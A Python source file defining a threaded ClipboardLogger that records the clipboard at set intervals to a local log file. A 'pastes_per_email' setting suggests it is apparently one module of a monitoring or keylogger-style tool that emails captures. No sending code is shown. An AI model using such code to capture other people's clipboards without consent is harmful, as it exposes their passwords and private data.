from pyperclip import paste
from os.path import join
import threading

from config.config_loader import get_section_config
from core.utils.logging_utils import log_data, log_error


class ClipboardLogger:
    def __init__(self):
        self.config = get_section_config("CLIPBOARD")
        self.log_file_path = join(self.config["logs_directory_path"], "clipboard.txt")
        self.error_file_path = join(self.config["logs_directory_path"], "errors.txt")
        self.counter = 0
        self.counter_max = int(self.config["pastes_per_email"])  # Convert to int
        self.interval = int(self.config["interval"])  # Convert to int
        self.stop_event = threading.Event()
        self.thread = None

    def log_clipboard(self):
        try:
            log_data(self.log_file_path, paste())
        except Exception as e:
            log_error(self.error_file_path, e)

    def run(self):
        print("Clipboard logger started.")
        while not self.stop_event.is_set():
            self.log_clipboard()
            self.stop_event.wait(self.interval)

    def start(self):
        if not self.thread or not self.thread.is_alive():
            self.stop_event.clear()
            self.thread = threading.Thread(target=self.run)
            self.thread.start()
        else:
            print("Attempted to start clipboard logger while it has already started!")

    def stop(self):
        self.stop_event.set()
        if self.thread and self.thread.is_alive():
            self.thread.join()
            print("Clipboard logger stopped.")
        else:
            print("Attempted to stop clipboard logger while it has not started!")
